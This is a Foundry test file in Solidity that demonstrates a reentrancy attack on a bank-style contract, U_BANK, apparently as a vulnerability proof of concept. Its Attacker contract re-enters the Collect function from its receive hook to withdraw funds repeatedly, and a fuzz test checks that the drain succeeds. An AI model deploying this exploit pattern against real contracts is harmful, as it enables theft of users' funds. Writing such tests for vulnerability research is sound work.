
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 2 ether, so attackVal must be at least 2 ether
        vm.assume(attackVal >= 2 ether && attackVal <= 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The Collect function requires:
        // - acc.balance >= MinSum (2 ether)
        // - acc.balance >= _am
        // - block.timestamp > acc.unlockTime

        // --- 3. Funding ---
        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the test contract
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds to meet the balance requirement
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlockTime check
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into U_BANK using Put function
        // unlockTime of 0 means it will be set to block.timestamp
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // Capture initial balance before attack
        initialSnapshot = address(this).balance;

        // Store the value for re-entrant calls
        storedAttackVal = val;

        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Verify success: if we called Collect more than once, the attack succeeded
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if we haven't exceeded our limit and victim still has funds
        if (attackCallCount < 3 && address(_victim).balance >= storedAttackVal) {
            // Re-enter the Collect function before state is updated
            _victim.Collect(storedAttackVal);
        }
    }
}
